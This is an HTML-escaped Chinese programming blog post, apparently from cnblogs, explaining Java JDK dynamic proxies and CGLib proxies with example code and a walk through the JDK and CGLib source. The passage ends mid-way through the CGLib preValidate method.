&lt;p&gt;　　这是一个真实的对象，我们希望在不更改原有代码逻辑的基础上增强该类的sayHello方法，利用JDK动态代理技术需要我们实现InvocationHandler接口中的invoke方法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;package&lt;/span&gt;&lt;span&gt; proxy;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.InvocationHandler;
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.Method;
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; 
&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; ProxySubject &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; InvocationHandler {
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt;&lt;span&gt; Object target;
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; 
&lt;span&gt; 9&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt;&lt;span&gt; ProxySubject(Object target) {
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;         &lt;span&gt;this&lt;/span&gt;.target =&lt;span&gt; target;
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; 
&lt;span&gt;13&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; Object invoke(Object proxy, Method method, Object[] args) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Throwable {
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;         System.out.println(&quot;调用前&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;         Object object =&lt;span&gt; method.invoke(target, args);
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;         System.out.println(&quot;调用后&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; object;
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　第15行，在invoke方法中可以看到，在调用目标对象的方法前后我们对方法进行了增加，这其实就是AOP中Before和After通知的奥义所在。&lt;/p&gt;
&lt;p&gt;　　加入测试代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;package&lt;/span&gt;&lt;span&gt; proxy;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.Proxy;
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; 
&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt; 6&lt;/span&gt; &lt;span&gt; * Created by Kevin on 2017/11/8.
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;  &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Test {
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;         Subject subject = (Subject) Proxy.newProxyInstance(RealSubject.&lt;span&gt;class&lt;/span&gt;.getClassLoader(), RealSubject.&lt;span&gt;class&lt;/span&gt;.getInterfaces(), &lt;span&gt;new&lt;/span&gt; ProxySubject(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; RealSubject()));
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;        subject.sayHello();
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; 
&lt;span&gt;13&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt;查看subject对象的类型&lt;/span&gt;
&lt;span&gt;14&lt;/span&gt; &lt;span&gt;        System.out.println(subject.getClass().getName());
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　执行结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/630246/201711/630246-20171109225742013-589217627.png&quot; alt=&quot;&quot; width=&quot;371&quot; height=&quot;118&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　可以看到和AOP几乎一样，前面提到过，动态代理就是AOP的核心。同时我们可以看到被代理的类的类型是：com.sun.proxy.$Proxy0。等会深入JDK源码时我们将会看到为什么。&lt;/p&gt;
&lt;p&gt;　　回到上面的例子，我们通过Proxy. newProxyInstance生成了一个代理类，显然这个类是在Run-Time（运行时）生成的，也就是说，JDK动态代理中代理类的生成来自于Java反射机制的支撑。&lt;/p&gt;
&lt;p&gt;　　上面例子中我们将实现InvocationHandler的类取名为“ProxySubject”，这其实是不准确的，我们看到了最后代理类的类型并不是ProxySubject，这个类实际上是处理需要增强的方法，也就是在invoke中的实现逻辑，最后并不是生成这个类型的代理类，这也不是生成的代理类，所以取名这个是不准确的。&lt;/p&gt;
&lt;p&gt;　　首先从Proxy.newProxyInstance开始，来研究JDK是如何生成代理类的。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; Object newProxyInstance(ClassLoader loader, Class&amp;lt;?&amp;gt;[] interfaces, InvocationHandler h)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　该方法有3个参数，了解JVM类加载的可能知道确定为同一个类需要有2个条件：&lt;/p&gt;
&lt;p&gt;　　要想生成目标对象的代理首先就要确保其类加载器相同，所以需要将目标对象的类加载器作为参数传递；其次JDK动态代理技术需要代理类和目标对象都继承自同一接口，所以需要将目标对象的接口作为参数传递；最后，传递InvocationHandler，这是主角，因为我们对目标对象的增强逻辑在这个实现类中，传递该对象使得代理类能够对其进行调用。&lt;/p&gt;
&lt;p&gt;　　在Proxy.newProxyInstance方法中创建代理类的过程主要有3步：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/630246/201711/630246-20171109230044716-741865672.png&quot; alt=&quot;&quot; width=&quot;354&quot; height=&quot;352&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;1.检查&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; Object newProxyInstance(ClassLoader loader,
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;                                       Class&amp;lt;?&amp;gt;&lt;span&gt;[] interfaces,
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;                                      InvocationHandler h)
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;     &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; IllegalArgumentException
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;{
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;     Objects.requireNonNull(h);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;1.1检查参数是否为空&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt; 
&lt;span&gt; 8&lt;/span&gt;     &lt;span&gt;final&lt;/span&gt; Class&amp;lt;?&amp;gt;[] intfs =&lt;span&gt; interfaces.clone();
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;     &lt;span&gt;final&lt;/span&gt; SecurityManager sm = System.getSecurityManager();    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取安全管理器，安全管理器用于对外部资源的访问控制&lt;/span&gt;
&lt;span&gt;10&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (sm != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;         checkProxyAccess(Reflection.getCallerClass(), loader, intfs);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;1.2检查是否有访问权限&lt;/span&gt;
&lt;span&gt;12&lt;/span&gt;     }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　在上面源码中有一个获取安全管理器以及检查是否具有访问权限的过程。安全管理器可能在实际中不太常用，它是为了程序在某些敏感资源的访问上做的权限控制，也就是起到保护程序的作用。在这里暂时不用仔细去探究，只需要大概了解即可。这里做的权限检查实际上是对ClassLoader的检查，例如：有的程序不允许你对类进行代理，此时加入安全管理器即可防止你对该类的代理。&lt;/p&gt;
&lt;h2&gt;2.获取代理类型&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
Class&amp;lt;?&amp;gt; cl = getProxyClass0(loader, intfs);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取代理类类型&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　这句话通过目标对象的类加载器，以及它所继承的接口，即可获取代理类的类型。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt; &lt;span&gt; * Generate a proxy class.  Must call the checkProxyAccess method
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; &lt;span&gt; * to perform permission checks before calling this.
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;*从注释中可以看到，这个方法用于生成代理类，在调用此方法前必须要确保
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;*已经做过权限检查。
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;  &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; Class&amp;lt;?&amp;gt;&lt;span&gt; getProxyClass0(ClassLoader loader,
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;                                        Class&amp;lt;?&amp;gt;&lt;span&gt;... interfaces) {
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (interfaces.length &amp;gt; 65535) {        &lt;span&gt;//&lt;/span&gt;&lt;span&gt;一个类最多实现65535个接口&lt;/span&gt;
&lt;span&gt;10&lt;/span&gt;         &lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; IllegalArgumentException(&quot;interface limit exceeded&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;     &lt;span&gt;return&lt;/span&gt; proxyClassCache.get(loader, interfaces);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;先从缓存中获取代理类，如果不存在则通过ProxyClassFactory创建，这其中会涉及到比较复杂的代理缓存机制，本篇主要讲动态代理过程的源码实现，对于动态代理的缓存机制在以后再研究。&lt;/span&gt;
&lt;span&gt;13&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　上面的方法返回的是com.sun.proxy.$Proxy0代理类型，下面就会通过这个代理类型生成代理类。&lt;/p&gt;
&lt;h2&gt; 3.生成代理类&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (sm != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;         checkNewProxyPermission(Reflection.getCallerClass(), cl);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;这里还需要做一次检查，检查的是生成的代理类型做权限检查，当然前提还是通过System.setSecurityManager设置安全管理类&lt;/span&gt;
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; 
&lt;span&gt; 6&lt;/span&gt;     &lt;span&gt;final&lt;/span&gt; Constructor&amp;lt;?&amp;gt; cons = cl.getConstructor(constructorParams);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;通过反射获取构造器，cl是代理类型其构造器的参数类型为InvocationHandler，所以参数传入InvocationHandler&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt;     &lt;span&gt;final&lt;/span&gt; InvocationHandler ih =&lt;span&gt; h;
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (!Modifier.isPublic(cl.getModifiers())) {   &lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断目标对象的构造器修饰符是我否为public，如果不是则不能生成代理类，返回null&lt;/span&gt;
&lt;span&gt; 9&lt;/span&gt;         AccessController.doPrivileged(&lt;span&gt;new&lt;/span&gt; PrivilegedAction&amp;lt;Void&amp;gt;&lt;span&gt;() {
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;             &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Void run() {
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;                 cons.setAccessible(&lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;                 &lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; &lt;span&gt;        });
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;     &lt;span&gt;return&lt;/span&gt; cons.newInstance(&lt;span&gt;new&lt;/span&gt; Object[]{h});    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;最后生成代理类&lt;/span&gt;
&lt;span&gt;17&lt;/span&gt; } &lt;span&gt;catch&lt;/span&gt; (IllegalAccessException|&lt;span&gt;InstantiationException e) {
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;     &lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; InternalError(e.toString(), e);
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; } &lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (InvocationTargetException e) {
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;     Throwable t =&lt;span&gt; e.getCause();
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (t &lt;span&gt;instanceof&lt;/span&gt;&lt;span&gt; RuntimeException) {
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;         &lt;span&gt;throw&lt;/span&gt;&lt;span&gt; (RuntimeException) t;
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;     } &lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt;         &lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; InternalError(t.toString(), t);
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; } &lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (NoSuchMethodException e) {
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt;     &lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; InternalError(e.toString(), e);
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　以上就是通过JDK动态代理生成代理类的过程，其中会涉及到动态代理的缓存机制，以及代理类字节码的生成过程，由于比较复杂，在本文暂不做介绍。由此可以清楚的看到，JDK的动态代理底层是通过Java反射机制实现的，并且需要目标对象继承自一个接口才能生成它的代理类。&lt;/p&gt;
&lt;p&gt;　　接下来探讨另一种动态代理技术——CGLib。&lt;/p&gt;

&lt;p&gt;　　通过CGLib来创建一个代理需要引入jar包，其pom.xml依赖如下所示：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('d631a940-b802-4143-bf89-42f18537eb94')&quot; readability=&quot;31.5&quot;&gt;&lt;img id=&quot;code_img_closed_d631a940-b802-4143-bf89-42f18537eb94&quot; class=&quot;code_img_closed&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_d631a940-b802-4143-bf89-42f18537eb94&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('d631a940-b802-4143-bf89-42f18537eb94',event)&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_d631a940-b802-4143-bf89-42f18537eb94&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;58&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;cglib&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;cglib&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;3.2.4&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;　　前面提到了CGLib动态代理技术不需要目标对象实现自一个接口：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;package&lt;/span&gt;&lt;span&gt; cglibproxy;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt; * 目标对象（需要被代理的类）
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt; * Created by Kevin on 2017/11/6.
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;  &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; RealSubject {
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; sayHello() {
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;         System.out.println(&quot;hello&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　下面我们就使用CGLib代理这个类：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;package&lt;/span&gt;&lt;span&gt; cglibproxy;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; net.sf.cglib.proxy.Enhancer;
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; net.sf.cglib.proxy.MethodInterceptor;
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; net.sf.cglib.proxy.MethodProxy;
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; 
&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.Method;
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; 
&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;10&lt;/span&gt; &lt;span&gt; * 代理类
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt; * Created by Kevin on 2017/11/6.
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;  &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;13&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; ProxySubject &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; MethodInterceptor {
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt; Enhancer enhancer = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Enhancer();
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; 
&lt;span&gt;16&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object getProxy(Class clazz) {
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; &lt;span&gt;        enhancer.setSuperclass(clazz);
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;         enhancer.setCallback(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt; enhancer.create();    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;用于创建无参的目标对象代理类，对于有参构造器则调用Enhancer.create(Class[] argumentTypes, Object[] arguments)，第一个参数表示参数类型，第二个参数表示参数的值。&lt;/span&gt;
&lt;span&gt;20&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt; 
&lt;span&gt;22&lt;/span&gt; &lt;span&gt;    @Override
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; Object intercept(Object object, Method method, Object[] args, MethodProxy methodProxy) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Throwable {
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt;         System.out.println(&quot;调用前&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt;         Object result =&lt;span&gt; methodProxy.invokeSuper(object, args);
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt;         System.out.println(&quot;调用后&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; result;
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　可以看到同样是需要实现一个接口——MethodIntercept，并且实现一个和invoke类似的方法——intercept。&lt;/p&gt;
&lt;p&gt;　　加入测试代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;package&lt;/span&gt;&lt;span&gt; cglibproxy;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt; * Created by Kevin on 2017/11/6.
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;  &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Main {
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;         RealSubject subject = (RealSubject) &lt;span&gt;new&lt;/span&gt; ProxySubject().getProxy(RealSubject.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;        subject.sayHello();
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;        System.out.println(subject.getClass().getName());
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　执行结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/630246/201711/630246-20171109230717388-241819521.png&quot; alt=&quot;&quot; width=&quot;369&quot; height=&quot;77&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　可以看到的执行结果和JDK动态代理的结果一样，不同的是代理类的类型是cglibproxy.RealSubject$$EnhancerByCGLIB$$cb568e93。接着我们来看CGLib是如何生成代理类的。&lt;/p&gt;
&lt;p&gt;　　生成代理类的是ProxySubject类中的getProxy方法，而其中又是传入两个参数：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
enhancer.setSuperclass(clazz);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置需要代理的类&lt;/span&gt;
enhancer.setCallback(&lt;span&gt;this&lt;/span&gt;);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置回调方法&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　参数设置好后就调用enhancer.create()方法创建代理类。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object create() {
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;     classOnly = &lt;span&gt;false&lt;/span&gt;;    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;这个字段设置为false表示返回的是具体的Object代理类，在createClass()方法中设置的是classOnly=true表示的返回class类型的代理类。&lt;/span&gt;
&lt;span&gt;3&lt;/span&gt;     argumentTypes = &lt;span&gt;null&lt;/span&gt;;        &lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建的是无参目标对象的代理类，故没有参数，所以参数类型设置为null&lt;/span&gt;
&lt;span&gt;4&lt;/span&gt;     &lt;span&gt;return&lt;/span&gt;&lt;span&gt; createHelper();
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　看来还在调用一个叫createHelper的方法。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;private&lt;/span&gt;&lt;span&gt; Object createHelper() {
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;     preValidate();        &lt;span&gt;//&lt;/span&gt;&lt;span&gt;提前作一些校验
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;    &lt;span&gt;//
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; &lt;span&gt;    ……
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; preValidate() {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (callbackTypes == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;         callbackTypes = CallbackInfo.determineTypes(callbacks, &lt;span&gt;false&lt;/span&gt;&lt;span&gt;);
